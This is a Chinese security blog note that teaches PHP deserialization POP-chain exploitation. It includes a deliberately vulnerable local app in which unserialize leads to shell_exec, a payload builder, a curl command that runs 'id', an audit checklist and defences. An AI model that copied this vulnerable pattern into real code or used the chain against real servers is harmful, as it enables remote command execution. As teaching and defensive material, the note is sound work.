---
title: "PHP 反序列化 POP 链"
slug: "php-pop-chain"
date: 2026-08-29T16:18:39+08:00
lastmod: 2026-10-27T11:30:00+08:00
draft: false
author: ["xuanwo"]
description: "从题目代码解析属性传递关系，构造 POP 链完成利用。"
summary: "从题目代码解析属性传递关系，构造 POP 链完成利用。"
tags: ["PHP", "POP链", "反序列化"]
categories: ["Web 安全"]
series: ["Web 安全笔记"]
weight: 7
ShowToc: true
TocOpen: false
hidemeta: false
comments: false
showReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowCodeCopyButtons: true
source_repo: "https://github.com/xuanwoLQL/security-notes/blob/main/web-security/12.php反序列化漏洞(pop链利用).md"
---

## 复现流程图

<figure class="note-diagram">
  <img src="/images/notes/php-pop-chain/workflow.svg" alt="从对象入口开始，沿属性引用和魔术方法寻找危险函数调用。" loading="lazy">
  <figcaption>图 1 · PHP POP 链构造。从对象入口开始，沿属性引用和魔术方法寻找危险函数调用。</figcaption>
</figure>

## 1. 一个可运行的 POP 链

创建 `/tmp/php-pop-basic/index.php`：

```php
<?php
class Template {
    public mixed $renderer;

    public function __destruct() {
        echo $this->renderer;
    }
}

class Renderer {
    public string $command;

    public function __toString(): string {
        return (string) shell_exec($this->command);
    }
}

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
```

启动：

```bash
cd /tmp/php-pop-basic
php -S 127.0.0.1:8080
```

## 2. 构造对象图

创建 `build.php`：

```php
<?php
class Template {
    public mixed $renderer;
}

class Renderer {
    public string $command = 'id';
}

$renderer = new Renderer();
$template = new Template();
$template->renderer = $renderer;

echo urlencode(serialize($template));
```

执行：

```bash
PAYLOAD="$(php /tmp/php-pop-basic/build.php)"
curl -sS --get --data-urlencode "data=$PAYLOAD" \
  'http://127.0.0.1:8080/'
```

预期返回 `uid=`。

## 3. 调用链

```text
unserialize
  → Template::__destruct()
  → echo $this->renderer
  → Renderer::__toString()
  → shell_exec($this->command)
```

## 4. 源码审计清单

- 找 `unserialize`；
- 找 `__destruct`、`__wakeup`、`__toString`；
- 找 `call_user_func`、`system`、`eval`、`include`；
- 找可写入的 public/protected 属性；
- 确认对象能否在属性中嵌套；
- 生成 serialize 后先本地运行一次。

## 5. 防护

- 禁止不可信 `unserialize`；
- `allowed_classes` 只放行 DTO；
- magic method 不读取外部可控 callable；
- 升级依赖中的已知 gadget；
- Web 进程禁用危险函数。
